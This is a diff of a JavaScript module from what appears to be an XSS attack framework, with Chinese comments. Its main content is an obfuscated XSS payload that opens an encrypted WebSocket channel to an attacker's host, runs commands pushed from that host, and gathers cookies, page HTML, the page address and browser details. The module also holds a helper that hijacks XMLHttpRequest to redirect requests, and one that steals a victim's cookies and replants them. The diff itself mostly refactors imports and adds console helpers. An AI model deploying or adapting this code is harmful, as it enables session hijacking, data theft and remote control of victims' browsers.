@@ -1,6 +1,5 @@
-import { proxyOneLineCommandAsync } from '../boot/xss_core';
-
-const crypto = require('crypto');
+import { proxyOneLineCommandAsync } from '../xss-core.js';
+import crypto from 'crypto';
 
 export const atob = str => Buffer.from(str, 'base64');
 export const btoa = str => Buffer.from(str).toString('base64');
@@ -8,11 +7,12 @@ export const getSecureKey = len => {
     len = len || 32;
     let key = '';
     for(let i = 0; i < len; i++){
-        key += String.fromCharCode(parseInt(Math.random() * 26 + 'a'.charCodeAt()));
+        key += String.fromCharCode(parseInt(Math.random() * 26 + 97));
     }
     return key;
 }
 
+/** 加解密js */
 export const cryptoPayload = 
     '!function(t,e){"object"==typeof exports?module.exports=exports=e():"function"==typeof define&&define.amd?define([],e):t.CryptoJS=e()}(this,function(){var h,t,e,r,i,n,f,o,s,c,a,l,d,m,x,b,H,z,A,u,p,_,v,y,g,B,w,k,S,C,D,E,R,M,F,P,W,O,I,U,K,X,L,j,N,T,q,Z,V,G,J,'+
     '$,Q,Y,tt,et,rt,it,nt,ot,st,ct,at,ht,lt,ft,dt,ut,pt,_t,vt,yt,gt,Bt,wt,kt,St,bt=bt||function(l){var t;if("undefined"!=typeof window&&window.crypto&&(t=window.crypto),!t&&"undefined"!=typeof window&&window.msCrypto&&(t=window.msCrypto),!t&&"undefined"!=typeof'+
@@ -203,38 +203,40 @@ export const cryptoPayload =
     'i<4;i++)Bt[i]=16711935&(Bt[i]<<8|Bt[i]>>>24)|4278255360&(Bt[i]<<24|Bt[i]>>>8),t[e+i]^=Bt[i]},blockSize:4,ivSize:2}),vt.RabbitLegacy=yt._createHelper(St),bt.pad.ZeroPadding={pad:function(t,e){var r=4*e;t.clamp(),t.sigBytes+=r-(t.sigBytes%r||r)},unpad:functi'+
     'on(t){var e=t.words,r=t.sigBytes-1;for(r=t.sigBytes-1;0<=r;r--)if(e[r>>>2]>>>24-r%4*8&255){t.sigBytes=r+1;break}}},bt});';
 
-
+/** 基础xss payload */
 export const baseXSSPayload = `var __encode ='jsjiami.com',_a={}, _0xb483=["_decode","http://www.sojson.com/javascriptobfuscator.html"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb87ba=["KGZ1bmN0aW9uKCl7CiAgICByZXR1cm4gewogICAgICAgIHRvTGlzdEhUTUwgOiBmdW5jdGlvbi`+
-'hsaXN0KXsKICAgICAgICAgICAgdmFyIGh0bWwgPSAnPHRhYmxlPic7CiAgICAgICAgICAgIGZvcih2YXIgaSBpbiBsaXN0KXsKICAgICAgICAgICAgICAgIGh0bWwgKz0gJzx0cj4nOwogICAgICAgICAgICAgICAgZm9yKHZhciBqIGluIGxpc3RbaV0pewogICAgICAgICAgICAgICAgICAgIGh0bWwgKz0gJzx0ZD4nICsgbGlzdFtpXVtqXS'+
-'ArICc8L3RkPic7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBodG1sICs9ICc8L3RyPicKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gaHRtbCArICc8L3RhYmxlPicKICAgICAgICB9LAogICAgICAgIGdldFBsdWdpbk5hbWUgOiBmdW5jdGlvbigpewogICAgICAgICAgICB2YXIgaW5mbyA9IFtdOwogICAgIC'+
-'AgICAgICB2YXIgcGx1Z2lucyA9IG5hdmlnYXRvci5wbHVnaW5zOwogICAgICAgICAgICBpZiAocGx1Z2lucy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbmF2aWdhdG9yLnBsdWdpbnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IG5hdmlnYXRvci5wbHVnaW5zW2'+
-'ldLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgdmFyIHZlcnNpb24gPSB0aGlzLmNoZWNrZVBsdWdzKG5hbWUpOwogICAgICAgICAgICAgICAgICAgIGluZm8ucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgOiBuYW1lLCB2ZXJzaW9uIDogdmVyc2lvbgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgIC'+
-'AgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBpbmZvOwogICAgICAgIH0sCiAgICAgICAgY2hlY2tlUGx1Z3MgOiBmdW5jdGlvbihwbHVnaW5uYW1lKXsKICAgICAgICAgICAgdmFyIGYgPSAiLSIKICAgICAgICAgICAgdmFyIHBsdWdpbnMgPSBuYXZpZ2F0b3IucGx1Z2luczsKICAgICAgICAgICAgaWYgKHBsdWdpbnMubG'+
-'VuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IG5hdmlnYXRvci5wbHVnaW5zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKG5hdmlnYXRvci5wbHVnaW5zW2ldLm5hbWUuaW5kZXhPZihwbHVnaW5uYW1lKSA+PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGYgPSBuYXZpZ2F0b3'+
-'IucGx1Z2luc1tpXS5kZXNjcmlwdGlvbi5zcGxpdChwbHVnaW5uYW1lKVsxXTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGY7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9LAogICAgICAgIGdldEJydyA6IGZ1bm'+
-'N0aW9uKCl7CiAgICAgICAgICAgIHZhciB0eXBlcyA9IFt7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ21zaWUnLAogICAgICAgICAgICAgICAgc3RyaW5nIDogJ0ludGVybmV0IEV4cGxvcmVyJwogICAgICAgICAgICB9LHsKICAgICAgICAgICAgICAgIGtleXdvcmQgOiAnZWRnJywKICAgICAgICAgICAgICAgIHN0cmluZyA6ICdFZG'+
-'dlJwogICAgICAgICAgICB9LHsKICAgICAgICAgICAgICAgIGtleXdvcmQgOiAnZmlyZWZveCcsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnRmlyZWZveCcKICAgICAgICAgICAgfSx7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ29wcicsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnT3BlcmEnCiAgICAgICAgICAgIH0sewogIC'+
-'AgICAgICAgICAgICAga2V5d29yZCA6ICdjaHJvbWUnLAogICAgICAgICAgICAgICAgc3RyaW5nIDogJ0Nocm9tZScKICAgICAgICAgICAgfSx7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ3NhZmFyaScsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnU2FmYXJpJwogICAgICAgICAgICB9XTsKICAgICAgICAgICAgZm9yKHZhciBpID'+
-'0gMDsgaSA8IHR5cGVzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgICAgIGlmKG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKS5pbmRleE9mKHR5cGVzW2ldLmtleXdvcmQpID4gMCl7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHR5cGVzW2ldLnN0cmluZzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogIC'+
-'AgICAgICAgICByZXR1cm4gJ1Vua25vd24nOwogICAgICAgIH0sCiAgICAgICAgZ2V0QnJ3VmVyc2lvbiA6IGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIHJldHVybiBuYXZpZ2F0b3IuYXBwVmVyc2lvbjsKICAgICAgICB9LAogICAgICAgIGdldEhUTUwgOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gJzxodG1sPicgKyBkb2N1bW'+
-'VudC5xdWVyeVNlbGVjdG9yKCdodG1sJykuaW5uZXJIVE1MICsgJzwvaHRtbD4nOwogICAgICAgIH0sCiAgICAgICAgaXNJZnJhbWUgOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gISF3aW5kb3cucGFyZW50OwogICAgICAgIH0sCiAgICAgICAgZ2V0TG9jYXRpb24gOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gbG'+
-'9jYXRpb24uaHJlZjsKICAgICAgICB9LAogICAgICAgIGdldENvb2tpZSA6IGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIHJldHVybiBkb2N1bWVudC5jb29raWU7CiAgICAgICAgfSwKICAgICAgICBnZXRSZXNvdXJjZVR5cGVHZXQgOiBmdW5jdGlvbih1cmwsIGNiKXsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cG'+
-'UgOiAnZ2V0JywKICAgICAgICAgICAgICAgIHVybCA6IHVybCwKICAgICAgICAgICAgICAgIHN1Y2Nlc3MgOiBmdW5jdGlvbihkYXRhKXsKICAgICAgICAgICAgICAgICAgICBjYih0eXBlb2YgZGF0YSA9PT0gJ29iamVjdCcgPyBKU09OLnN0cmluZ2lmeShkYXRhKSA6IGRhdGEpOwogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgIC'+
-'AgIGVycm9yIDogZnVuY3Rpb24oZGF0YSl7CiAgICAgICAgICAgICAgICAgICAgY2IodHlwZW9mIGRhdGEgPT09ICdvYmplY3QnID8gSlNPTi5zdHJpbmdpZnkoZGF0YSkgOiBkYXRhKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9LAogICAgICAgIGxvYWRKUyA6IGZ1bmN0aW9uKHVybCl7CiAgICAgICAgIC'+
-'AgICQuZ2V0U2NyaXB0KHVybCk7CiAgICAgICAgfSwKICAgICAgICBwcm94eVJlcXVlc3QgOiBmdW5jdGlvbih0eXBlLCB1cmwsIGRhdGEsIGhlYWRlcnMsIGNiKXsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cGUgOiB0eXBlLAogICAgICAgICAgICAgICAgdXJsIDogdXJsLAogICAgICAgICAgICAgICAgZGF0YS'+
-'A6IGRhdGEsCiAgICAgICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbihyZXF1ZXN0KXsKICAgICAgICAgICAgICAgICAgICBmb3IodmFyIGkgaW4gaGVhZGVycyl7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcihpLCBoZWFkZXJzW2ldKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgIC'+
-'AgICAgICAgICB9LAogICAgICAgICAgICAgICAgc3VjY2VzcyA6IGZ1bmN0aW9uKGRhdGEpewogICAgICAgICAgICAgICAgICAgIGNiKHR5cGVvZiBkYXRhID09PSAnb2JqZWN0JyA/IEpTT04uc3RyaW5naWZ5KGRhdGEpIDogZGF0YSk7CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZXJyb3IgOiBmdW5jdGlvbihkYXRhKX'+
-'sKICAgICAgICAgICAgICAgICAgICBjYih0eXBlb2YgZGF0YSA9PT0gJ29iamVjdCcgPyBKU09OLnN0cmluZ2lmeShkYXRhKSA6IGRhdGEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgIH07Cn0pKCkg","e","fromCharCode","al","stringify","parse","Utf8","enc","ECB","mode","P'+
-'kcs7","pad","encrypt","AES","send","onmessage","data","cachex","normal","async","decrypt","secure","command","type","undefined","log","删除","版本号，js会定","期弹窗，","还请支持我们的工作","jsjia","mi.com"];(function(){var _0xbd27x1= new WebSocket(host);var _0xbd27x2=window[_'+
-'_Oxb87ba[0x1]+ String[__Oxb87ba[0x2]](118)+ __Oxb87ba[0x3]](atob(__Oxb87ba[0x0]));var _0xbd27x3=function(_0xbd27x4,_0xbd27x5,_0xbd27x6,_0xbd27x7){var _0xbd27x8=CryptoJS[__Oxb87ba[0xd]][__Oxb87ba[0xc]](JSON[__Oxb87ba[0x4]]({type:_0xbd27x6,id:_0xbd27x7,data:'+
-'_0xbd27x4}),CryptoJS[__Oxb87ba[0x7]][__Oxb87ba[0x6]][__Oxb87ba[0x5]](_0xbd27x5),{mode:CryptoJS[__Oxb87ba[0x9]][__Oxb87ba[0x8]],padding:CryptoJS[__Oxb87ba[0xb]][__Oxb87ba[0xa]]});_0xbd27x1[__Oxb87ba[0xe]](_0xbd27x8)};_0xbd27x1[__Oxb87ba[0xf]]= function(_0xb'+
-'d27x4){var _0xbd27x5=_0xbd27x4[__Oxb87ba[0x10]];window[__Oxb87ba[0x11]]= {send:function(_0xbd27x4){_0xbd27x3(_0xbd27x4,_0xbd27x5,__Oxb87ba[0x12],-1)},sendAsync:function(_0xbd27x4,_0xbd27x7){_0xbd27x3(_0xbd27x4,_0xbd27x5,__Oxb87ba[0x13],_0xbd27x7)},utils:_0'+
-'xbd27x2};_0xbd27x1[__Oxb87ba[0xf]]= function(_0xbd27x4){var _0xbd27x9=CryptoJS[__Oxb87ba[0xd]][__Oxb87ba[0x14]](_0xbd27x4[__Oxb87ba[0x10]],CryptoJS[__Oxb87ba[0x7]][__Oxb87ba[0x6]][__Oxb87ba[0x5]](_0xbd27x5),{mode:CryptoJS[__Oxb87ba[0x9]][__Oxb87ba[0x8]],pa'+
-'dding:CryptoJS[__Oxb87ba[0xb]][__Oxb87ba[0xa]]});var _0xbd27xa=JSON[__Oxb87ba[0x5]](_0xbd27x9.toString(CryptoJS[__Oxb87ba[0x7]].Utf8));switch(_0xbd27xa[__Oxb87ba[0x17]]){case __Oxb87ba[0x15]:_0xbd27x5= _0xbd27xa[__Oxb87ba[0x10]];break;case __Oxb87ba[0x16]:'+
-'window[__Oxb87ba[0x1]+ String[__Oxb87ba[0x2]](99+ 19)+ __Oxb87ba[0x3]](_0xbd27xa[__Oxb87ba[0x10]]);break}}}})();;;(function(_0xbd27xb,_0xbd27xc,_0xbd27xd,_0xbd27xe,_0xbd27xf,_0xbd27x10){_0xbd27x10= __Oxb87ba[0x18];_0xbd27xe= function(_0xbd27x11){if( typeof'+
-' alert!== _0xbd27x10){alert(_0xbd27x11)};if( typeof console!== _0xbd27x10){console[__Oxb87ba[0x19]](_0xbd27x11)}};_0xbd27xd= function(_0xbd27x12,_0xbd27xb){return _0xbd27x12+ _0xbd27xb};_0xbd27xf= _0xbd27xd(__Oxb87ba[0x1a],_0xbd27xd(_0xbd27xd(__Oxb87ba[0x1'+
-'b],__Oxb87ba[0x1c]),__Oxb87ba[0x1d]));try{_0xbd27xb= __encode;if(!( typeof _0xbd27xb!== _0xbd27x10&& _0xbd27xb=== _0xbd27xd(__Oxb87ba[0x1e],__Oxb87ba[0x1f]))){_0xbd27xe(_0xbd27xf)}}catch(e){_0xbd27xe(_0xbd27xf)}})({})';
+    'hsaXN0KXsKICAgICAgICAgICAgdmFyIGh0bWwgPSAnPHRhYmxlPic7CiAgICAgICAgICAgIGZvcih2YXIgaSBpbiBsaXN0KXsKICAgICAgICAgICAgICAgIGh0bWwgKz0gJzx0cj4nOwogICAgICAgICAgICAgICAgZm9yKHZhciBqIGluIGxpc3RbaV0pewogICAgICAgICAgICAgICAgICAgIGh0bWwgKz0gJzx0ZD4nICsgbGlzdFtpXVtqXS'+
+    'ArICc8L3RkPic7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBodG1sICs9ICc8L3RyPicKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gaHRtbCArICc8L3RhYmxlPicKICAgICAgICB9LAogICAgICAgIGdldFBsdWdpbk5hbWUgOiBmdW5jdGlvbigpewogICAgICAgICAgICB2YXIgaW5mbyA9IFtdOwogICAgIC'+
+    'AgICAgICB2YXIgcGx1Z2lucyA9IG5hdmlnYXRvci5wbHVnaW5zOwogICAgICAgICAgICBpZiAocGx1Z2lucy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbmF2aWdhdG9yLnBsdWdpbnMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IG5hdmlnYXRvci5wbHVnaW5zW2'+
+    'ldLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgdmFyIHZlcnNpb24gPSB0aGlzLmNoZWNrZVBsdWdzKG5hbWUpOwogICAgICAgICAgICAgICAgICAgIGluZm8ucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgOiBuYW1lLCB2ZXJzaW9uIDogdmVyc2lvbgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgIC'+
+    'AgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBpbmZvOwogICAgICAgIH0sCiAgICAgICAgY2hlY2tlUGx1Z3MgOiBmdW5jdGlvbihwbHVnaW5uYW1lKXsKICAgICAgICAgICAgdmFyIGYgPSAiLSIKICAgICAgICAgICAgdmFyIHBsdWdpbnMgPSBuYXZpZ2F0b3IucGx1Z2luczsKICAgICAgICAgICAgaWYgKHBsdWdpbnMubG'+
+    'VuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8IG5hdmlnYXRvci5wbHVnaW5zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKG5hdmlnYXRvci5wbHVnaW5zW2ldLm5hbWUuaW5kZXhPZihwbHVnaW5uYW1lKSA+PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGYgPSBuYXZpZ2F0b3'+
+    'IucGx1Z2luc1tpXS5kZXNjcmlwdGlvbi5zcGxpdChwbHVnaW5uYW1lKVsxXTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGY7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9LAogICAgICAgIGdldEJydyA6IGZ1bm'+
+    'N0aW9uKCl7CiAgICAgICAgICAgIHZhciB0eXBlcyA9IFt7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ21zaWUnLAogICAgICAgICAgICAgICAgc3RyaW5nIDogJ0ludGVybmV0IEV4cGxvcmVyJwogICAgICAgICAgICB9LHsKICAgICAgICAgICAgICAgIGtleXdvcmQgOiAnZWRnJywKICAgICAgICAgICAgICAgIHN0cmluZyA6ICdFZG'+
+    'dlJwogICAgICAgICAgICB9LHsKICAgICAgICAgICAgICAgIGtleXdvcmQgOiAnZmlyZWZveCcsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnRmlyZWZveCcKICAgICAgICAgICAgfSx7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ29wcicsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnT3BlcmEnCiAgICAgICAgICAgIH0sewogIC'+
+    'AgICAgICAgICAgICAga2V5d29yZCA6ICdjaHJvbWUnLAogICAgICAgICAgICAgICAgc3RyaW5nIDogJ0Nocm9tZScKICAgICAgICAgICAgfSx7CiAgICAgICAgICAgICAgICBrZXl3b3JkIDogJ3NhZmFyaScsCiAgICAgICAgICAgICAgICBzdHJpbmcgOiAnU2FmYXJpJwogICAgICAgICAgICB9XTsKICAgICAgICAgICAgZm9yKHZhciBpID'+
+    '0gMDsgaSA8IHR5cGVzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgICAgIGlmKG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKS5pbmRleE9mKHR5cGVzW2ldLmtleXdvcmQpID4gMCl7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHR5cGVzW2ldLnN0cmluZzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogIC'+
+    'AgICAgICAgICByZXR1cm4gJ1Vua25vd24nOwogICAgICAgIH0sCiAgICAgICAgZ2V0QnJ3VmVyc2lvbiA6IGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIHJldHVybiBuYXZpZ2F0b3IuYXBwVmVyc2lvbjsKICAgICAgICB9LAogICAgICAgIGdldEhUTUwgOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gJzxodG1sPicgKyBkb2N1bW'+
+    'VudC5xdWVyeVNlbGVjdG9yKCdodG1sJykuaW5uZXJIVE1MICsgJzwvaHRtbD4nOwogICAgICAgIH0sCiAgICAgICAgaXNJZnJhbWUgOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gISF3aW5kb3cucGFyZW50OwogICAgICAgIH0sCiAgICAgICAgZ2V0TG9jYXRpb24gOiBmdW5jdGlvbigpewogICAgICAgICAgICByZXR1cm4gbG'+
+    '9jYXRpb24uaHJlZjsKICAgICAgICB9LAogICAgICAgIGdldENvb2tpZSA6IGZ1bmN0aW9uKCl7CiAgICAgICAgICAgIHJldHVybiBkb2N1bWVudC5jb29raWU7CiAgICAgICAgfSwKICAgICAgICBnZXRSZXNvdXJjZVR5cGVHZXQgOiBmdW5jdGlvbih1cmwsIGNiKXsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cG'+
+    'UgOiAnZ2V0JywKICAgICAgICAgICAgICAgIHVybCA6IHVybCwKICAgICAgICAgICAgICAgIHN1Y2Nlc3MgOiBmdW5jdGlvbihkYXRhKXsKICAgICAgICAgICAgICAgICAgICBjYih0eXBlb2YgZGF0YSA9PT0gJ29iamVjdCcgPyBKU09OLnN0cmluZ2lmeShkYXRhKSA6IGRhdGEpOwogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgIC'+
+    'AgIGVycm9yIDogZnVuY3Rpb24oZGF0YSl7CiAgICAgICAgICAgICAgICAgICAgY2IodHlwZW9mIGRhdGEgPT09ICdvYmplY3QnID8gSlNPTi5zdHJpbmdpZnkoZGF0YSkgOiBkYXRhKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9LAogICAgICAgIGxvYWRKUyA6IGZ1bmN0aW9uKHVybCl7CiAgICAgICAgIC'+
+    'AgICQuZ2V0U2NyaXB0KHVybCk7CiAgICAgICAgfSwKICAgICAgICBwcm94eVJlcXVlc3QgOiBmdW5jdGlvbih0eXBlLCB1cmwsIGRhdGEsIGhlYWRlcnMsIGNiKXsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cGUgOiB0eXBlLAogICAgICAgICAgICAgICAgdXJsIDogdXJsLAogICAgICAgICAgICAgICAgZGF0YS'+
+    'A6IGRhdGEsCiAgICAgICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbihyZXF1ZXN0KXsKICAgICAgICAgICAgICAgICAgICBmb3IodmFyIGkgaW4gaGVhZGVycyl7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcihpLCBoZWFkZXJzW2ldKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgIC'+
+    'AgICAgICAgICB9LAogICAgICAgICAgICAgICAgc3VjY2VzcyA6IGZ1bmN0aW9uKGRhdGEpewogICAgICAgICAgICAgICAgICAgIGNiKHR5cGVvZiBkYXRhID09PSAnb2JqZWN0JyA/IEpTT04uc3RyaW5naWZ5KGRhdGEpIDogZGF0YSk7CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZXJyb3IgOiBmdW5jdGlvbihkYXRhKX'+
+    'sKICAgICAgICAgICAgICAgICAgICBjYih0eXBlb2YgZGF0YSA9PT0gJ29iamVjdCcgPyBKU09OLnN0cmluZ2lmeShkYXRhKSA6IGRhdGEpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgIH07Cn0pKCkg","e","fromCharCode","al","stringify","parse","Utf8","enc","ECB","mode","P'+
+    'kcs7","pad","encrypt","AES","send","onmessage","data","cachex","normal","async","decrypt","secure","command","type","undefined","log","删除","版本号，js会定","期弹窗，","还请支持我们的工作","jsjia","mi.com"];(function(){var _0xbd27x1= new WebSocket(host);var _0xbd27x2=window[_'+
+    '_Oxb87ba[0x1]+ String[__Oxb87ba[0x2]](118)+ __Oxb87ba[0x3]](atob(__Oxb87ba[0x0]));var _0xbd27x3=function(_0xbd27x4,_0xbd27x5,_0xbd27x6,_0xbd27x7){var _0xbd27x8=CryptoJS[__Oxb87ba[0xd]][__Oxb87ba[0xc]](JSON[__Oxb87ba[0x4]]({type:_0xbd27x6,id:_0xbd27x7,data:'+
+    '_0xbd27x4}),CryptoJS[__Oxb87ba[0x7]][__Oxb87ba[0x6]][__Oxb87ba[0x5]](_0xbd27x5),{mode:CryptoJS[__Oxb87ba[0x9]][__Oxb87ba[0x8]],padding:CryptoJS[__Oxb87ba[0xb]][__Oxb87ba[0xa]]});_0xbd27x1[__Oxb87ba[0xe]](_0xbd27x8)};_0xbd27x1[__Oxb87ba[0xf]]= function(_0xb'+
+    'd27x4){var _0xbd27x5=_0xbd27x4[__Oxb87ba[0x10]];window[__Oxb87ba[0x11]]= {send:function(_0xbd27x4){_0xbd27x3(_0xbd27x4,_0xbd27x5,__Oxb87ba[0x12],-1)},sendAsync:function(_0xbd27x4,_0xbd27x7){_0xbd27x3(_0xbd27x4,_0xbd27x5,__Oxb87ba[0x13],_0xbd27x7)},utils:_0'+
+    'xbd27x2};_0xbd27x1[__Oxb87ba[0xf]]= function(_0xbd27x4){var _0xbd27x9=CryptoJS[__Oxb87ba[0xd]][__Oxb87ba[0x14]](_0xbd27x4[__Oxb87ba[0x10]],CryptoJS[__Oxb87ba[0x7]][__Oxb87ba[0x6]][__Oxb87ba[0x5]](_0xbd27x5),{mode:CryptoJS[__Oxb87ba[0x9]][__Oxb87ba[0x8]],pa'+
+    'dding:CryptoJS[__Oxb87ba[0xb]][__Oxb87ba[0xa]]});var _0xbd27xa=JSON[__Oxb87ba[0x5]](_0xbd27x9.toString(CryptoJS[__Oxb87ba[0x7]].Utf8));switch(_0xbd27xa[__Oxb87ba[0x17]]){case __Oxb87ba[0x15]:_0xbd27x5= _0xbd27xa[__Oxb87ba[0x10]];break;case __Oxb87ba[0x16]:'+
+    'window[__Oxb87ba[0x1]+ String[__Oxb87ba[0x2]](99+ 19)+ __Oxb87ba[0x3]](_0xbd27xa[__Oxb87ba[0x10]]);break}}}})();;;(function(_0xbd27xb,_0xbd27xc,_0xbd27xd,_0xbd27xe,_0xbd27xf,_0xbd27x10){_0xbd27x10= __Oxb87ba[0x18];_0xbd27xe= function(_0xbd27x11){if( typeof'+
+    ' alert!== _0xbd27x10){alert(_0xbd27x11)};if( typeof console!== _0xbd27x10){console[__Oxb87ba[0x19]](_0xbd27x11)}};_0xbd27xd= function(_0xbd27x12,_0xbd27xb){return _0xbd27x12+ _0xbd27xb};_0xbd27xf= _0xbd27xd(__Oxb87ba[0x1a],_0xbd27xd(_0xbd27xd(__Oxb87ba[0x1'+
+    'b],__Oxb87ba[0x1c]),__Oxb87ba[0x1d]));try{_0xbd27xb= __encode;if(!( typeof _0xbd27xb!== _0xbd27x10&& _0xbd27xb=== _0xbd27xd(__Oxb87ba[0x1e],__Oxb87ba[0x1f]))){_0xbd27xe(_0xbd27xf)}}catch(e){_0xbd27xe(_0xbd27xf)}})({})';
 
+
+/** 获取更改浏览器请求目标工具函数 */
 export const hookRequestPayload = (server_name, domain, port) => {
     return `
         XMLHttpRequest.prototype.___open = XMLHttpRequest.prototype.open;
@@ -270,6 +272,8 @@ export const hookRequestPayload = (server_name, domain, port) => {
     `
 }
 
+/** 获取cookie工具函数 */
+
 export const cookiePayload = server_name => new Promise(async resolve => {
     //通过server_name拿cookie
     const cookie = await proxyOneLineCommandAsync(server_name, 'document.cookie');
@@ -291,8 +295,10 @@ export const cookiePayload = server_name => new Promise(async resolve => {
             var arr = fxxk_xss_arrcookie[i].split("=");
             fxxkxss_setCookie(arr[0], arr[1], 999999);
         }
-    `)
+    `);
 });
+
+/** 加解密工具函数 */
 
 export const encrypt = (data, secure, iv) => {
     iv = iv || "";
@@ -317,4 +323,103 @@ export const decrypt = (data, secure, iv) => {
     cipherChunks.push(decipher.update(data, cipherEncoding, clearEncoding));
     cipherChunks.push(decipher.final(clearEncoding));
     return cipherChunks.join('');
+}
+
+/** 输入输出工具函数  */
+
+import { stdin, stdout } from 'process';
+import readline_origin from 'readline';
+
+const readline = readline_origin.createInterface({
+    input : stdin,
+    output : stdout
+});
+
+export const getline = ask => new Promise(async resolve => {
+    readline.question(ask, str => resolve(str));
+});
+
+/** log工具函数 */
+
+export const default_logs = [];
+
+const styles = {
+    'bold'          : ['\x1B[1m',  '\x1B[22m'],
+    'italic'        : ['\x1B[3m',  '\x1B[23m'],
+    'underline'     : ['\x1B[4m',  '\x1B[24m'],
+    'inverse'       : ['\x1B[7m',  '\x1B[27m'],
+    'strikethrough' : ['\x1B[9m',  '\x1B[29m'],
+    'white'         : ['\x1B[37m', '\x1B[39m'],
+    'grey'          : ['\x1B[90m', '\x1B[39m'],
+    'black'         : ['\x1B[30m', '\x1B[39m'],
+    'blue'          : ['\x1B[34m', '\x1B[39m'],
+    'cyan'          : ['\x1B[36m', '\x1B[39m'],
+    'green'         : ['\x1B[32m', '\x1B[39m'],
+    'magenta'       : ['\x1B[35m', '\x1B[39m'],
+    'red'           : ['\x1B[31m', '\x1B[39m'],
+    'yellow'        : ['\x1B[33m', '\x1B[39m'],
+    'whiteBG'       : ['\x1B[47m', '\x1B[49m'],
+    'greyBG'        : ['\x1B[49;5;8m', '\x1B[49m'],
+    'blackBG'       : ['\x1B[40m', '\x1B[49m'],
+    'blueBG'        : ['\x1B[44m', '\x1B[49m'],
+    'cyanBG'        : ['\x1B[46m', '\x1B[49m'],
